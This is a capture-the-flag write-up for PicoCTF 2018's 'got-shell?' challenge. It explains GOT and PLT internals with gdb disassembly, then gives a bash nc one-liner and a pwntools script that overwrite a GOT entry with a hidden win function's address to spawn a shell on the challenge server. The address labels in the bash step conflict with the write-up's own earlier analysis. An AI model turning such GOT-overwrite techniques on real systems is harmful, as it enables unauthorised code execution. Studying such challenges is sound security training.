# Write-up for shellcode challenge
# PicoCTF_2018: got-shell?

**Category:** Binary Exploitation
**Points:** 350

>Can you authenticate to this service and get the flag? Connect to it with nc 2018shell.picoctf.com 23731. Source

> # Introduction
In this challenge our goal is to overwrite the Global Offset Table and redirect program execution

If you don't know what GOT and PLT are, there is a very good explanation [here](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).

In brief, most programs call some functions that are included in libraries (e.g. printf in libc library). However, we notice that
processor doesn't call instantly printf function, but instruction pointer goes first to procedure link table (printf@plt). 



There, we're performing a jump. Specifically, a jump to a function pointer. This pointer could be found in got.plt section.
If we go to the address that pointer points to we find 
the real address of printf.

It's important to mention that this procedure happens when we've already called printf at least once. If we haven't called printf 
before, we need to trigger the first lookup. You can find what happens exactly in the link above.
For the attack, what matters is that program makes a jump to an address, which location we know. (remember the pointer and the dereference our processor does first, to jump to the resulting address)

Let's disassemble the binary with gdb and see all this stuff I've told you so far.

```asm
Dump of assembler code for function main:
=> 0x08048564 <+0>:	lea    ecx,[esp+0x4]
   0x08048568 <+4>:	and    esp,0xfffffff0
   0x0804856b <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804856e <+10>:	push   ebp
   0x0804856f <+11>:	mov    ebp,esp
   0x08048571 <+13>:	push   ecx
   0x08048572 <+14>:	sub    esp,0x124
   0x08048578 <+20>:	mov    eax,ecx
   0x0804857a <+22>:	mov    eax,DWORD PTR [eax+0x4]
   0x0804857d <+25>:	mov    DWORD PTR [ebp-0x11c],eax
   0x08048583 <+31>:	mov    eax,gs:0x14
   0x08048589 <+37>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804858c <+40>:	xor    eax,eax
   0x0804858e <+42>:	mov    eax,ds:0x804a030
   0x08048593 <+47>:	push   0x0
   0x08048595 <+49>:	push   0x2
   0x08048597 <+51>:	push   0x0
   0x08048599 <+53>:	push   eax
   0x0804859a <+54>:	call   0x8048410 <setvbuf@plt>
   0x0804859f <+59>:	add    esp,0x10
   0x080485a2 <+62>:	sub    esp,0xc
   0x080485a5 <+65>:	push   0x80486f8
   0x080485aa <+70>:	call   0x80483d0 <puts@plt>
   0x080485af <+75>:	add    esp,0x10
   0x080485b2 <+78>:	sub    esp,0x8
   0x080485b5 <+81>:	lea    eax,[ebp-0x114]
   0x080485bb <+87>:	push   eax
   0x080485bc <+88>:	push   0x8048758
   0x080485c1 <+93>:	call   0x8048430 <__isoc99_scanf@plt>
   0x080485c6 <+98>:	add    esp,0x10
   0x080485c9 <+101>:	mov    eax,DWORD PTR [ebp-0x114]
   0x080485cf <+107>:	sub    esp,0x4
   0x080485d2 <+110>:	push   eax
   0x080485d3 <+111>:	push   0x804875c
   0x080485d8 <+116>:	lea    eax,[ebp-0x10c]
   0x080485de <+122>:	push   eax
   0x080485df <+123>:	call   0x8048420 <sprintf@plt>
   0x080485e4 <+128>:	add    esp,0x10
   0x080485e7 <+131>:	sub    esp,0xc
   0x080485ea <+134>:	lea    eax,[ebp-0x10c]
   0x080485f0 <+140>:	push   eax
   0x080485f1 <+141>:	call   0x80483d0 <puts@plt>
   0x080485f6 <+146>:	add    esp,0x10
   0x080485f9 <+149>:	sub    esp,0x8
   0x080485fc <+152>:	lea    eax,[ebp-0x110]
   0x08048602 <+158>:	push   eax
   0x08048603 <+159>:	push   0x8048758
   0x08048608 <+164>:	call   0x8048430 <__isoc99_scanf@plt>
   0x0804860d <+169>:	add    esp,0x10
   0x08048610 <+172>:	mov    edx,DWORD PTR [ebp-0x114]
   0x08048616 <+178>:	mov    eax,DWORD PTR [ebp-0x110]
   0x0804861c <+184>:	push   edx
   0x0804861d <+185>:	push   eax
   0x0804861e <+186>:	push   0x8048791
   0x08048623 <+191>:	lea    eax,[ebp-0x10c]
   0x08048629 <+197>:	push   eax
   0x0804862a <+198>:	call   0x8048420 <sprintf@plt>
   0x0804862f <+203>:	add    esp,0x10
   0x08048632 <+206>:	sub    esp,0xc
   0x08048635 <+209>:	lea    eax,[ebp-0x10c]
   0x0804863b <+215>:	push   eax
   0x0804863c <+216>:	call   0x80483d0 <puts@plt>
   0x08048641 <+221>:	add    esp,0x10
   0x08048644 <+224>:	mov    eax,DWORD PTR [ebp-0x114]
   0x0804864a <+230>:	mov    edx,eax
   0x0804864c <+232>:	mov    eax,DWORD PTR [ebp-0x110]
   0x08048652 <+238>:	mov    DWORD PTR [edx],eax
   0x08048654 <+240>:	sub    esp,0xc
   0x08048657 <+243>:	push   0x80487ac
   0x0804865c <+248>:	call   0x80483d0 <puts@plt>
   0x08048661 <+253>:	add    esp,0x10
   0x08048664 <+256>:	sub    esp,0xc
   0x08048667 <+259>:	push   0x1
   0x08048669 <+261>:	call   0x80483f0 <exit@plt>
End of assembler dump.
```

Okay, a lot of puts@plt functions. We set a breakpoint at the second puts@plt.

![Screenshot from 2019-10-12 20-38-50](https://user-images.githubusercontent.com/37578272/66705516-61691300-ed30-11e9-9315-d71b3c9caa62.png)

We can see that our program first goes to plt section and the first instruction is a jmp to an address which is pointed by 0x804a00c.
Going to 0x804a00c (inside got.plt) we find 0xf7e3a210 which is the real address of puts.

Now, what if we could change the address pointed by 0x804a00c? We could redirect our program execution, not going puts function but in some malware function or in a shellcode injected by us.
Of course, this could happen in the first call of puts. 
Just following a different procedure does not mean that we do not have a jump again to a pointer of an address. Simply the first time, the address is not puts' real address but processor in reality goes to the next instruction in plt section of puts so as to 
to trigger the first lookup. But, we don't care, again we can redirect program execution. 
Disassembling exit@plt function we get the following:
![Screenshot from 2019-10-12 20-52-04](https://user-images.githubusercontent.com/37578272/66705651-2bc52980-ed32-11e9-8f04-1d87533cd17c.png)

It's the first call so in 0x804a014 (got.plt section) we have 0x080483f6 which is not exit's real address but we return to exit@plt as I mentioned above.
But, again if we change the value inside 0x804a014 we could make great things.

Here, I want to mention to you to check about RELRO, ASLR, DEP, PIE that could make our job too difficult. Some of them in this binary are disabled
and we can hardcode the addresses and also write to GOT(--> partial RELRO)

The program kindly allows us to write an arbitrary DWORD(whatever it is, could be an address too) to an arbitrary address. 
Hmm, only 4 bytes. We can't inject a shellcode. 
Thinking some time of what to do, I searched the functions that are included in this program and look what I found:
```bash
objdump -t auth
```
![Screenshot from 2019-10-12 21-03-26](https://user-images.githubusercontent.com/37578272/66705776-c40fde00-ed33-11e9-8c7d-dee284806f5e.png)

There is a win function we couldn't see. Disassembling win function:
```asm
Dump of assembler code for function win:
   0x0804854b <+0>:	push   ebp
   0x0804854c <+1>:	mov    ebp,esp
   0x0804854e <+3>:	sub    esp,0x8
   0x08048551 <+6>:	sub    esp,0xc
   0x08048554 <+9>:	push   0x80486f0 ; address of "/bin/sh"
   0x08048559 <+14>:	call   0x80483e0 <system@plt>
   0x0804855e <+19>:	add    esp,0x10
   0x08048561 <+22>:	nop
   0x08048562 <+23>:	leave  
   0x08048563 <+24>:	ret    
End of assembler dump.
```
Ohhh win function calls system with /bin/sh argument. If we redirect our program there we will get a shell.

Consequently, when program ask us in which address to write something, we tell them to 0x804a00c ( exit@got.plt ). And what to write?

ofcourse the address of win function: 0x0804854b

That's it, lets write a script both in bash and python.
```bash
(echo 0x804a00c; echo; echo 0x804854b; cat) | nc 2018shell.picoctf.com 23731
```
Then we've got a shell and running **cat flag.txt** gives us the flag.

```python
#!/usr/bin/python
from pwn import *
from time import sleep

auth = ELF('./auth')

win_func_addr = str(hex(auth.symbols['win']))
exit_got_plt = str(hex(auth.got['exit']))
s = remote("2018shell.picoctf.com", 23731)

print 'win address = ', win_func_addr
print 'exit@got.plt addr = ', exit_got_plt
print s.recv()
s.sendline(exit_got_plt)
print s.recv()
s.sendline(win_func_addr)
s.sendline('cat flag.txt')
s.interactive()
s.close()
```





